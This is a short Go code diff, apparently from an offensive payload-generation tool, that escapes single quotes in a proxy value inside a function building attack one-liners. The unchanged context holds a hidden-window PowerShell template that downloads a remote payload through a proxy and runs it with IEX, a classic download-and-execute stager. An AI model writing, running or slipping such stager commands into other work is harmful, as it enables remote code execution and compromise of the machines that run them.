@@ -5,6 +5,7 @@ import (
 	"log/slog"
 	"os"
 	"path/filepath"
+	"strings"
 	"sync"
 	"time"
 
@@ -238,7 +239,7 @@ func buildOneLiners(payloadType, ps1Code, payloadURL, hostPath, proxy string) []
 			Desc: "Download and execute via HTTP proxy",
 			Command: fmt.Sprintf(
 				`powershell -nop -w hidden -c "$wc=New-Object Net.WebClient;$wc.Proxy=New-Object Net.WebProxy('%s');IEX($wc.DownloadString('%s'))"`,
-				proxy, payloadURL),
+				strings.ReplaceAll(proxy, "'", "''"), payloadURL),
 		})
 
 	case "linux":
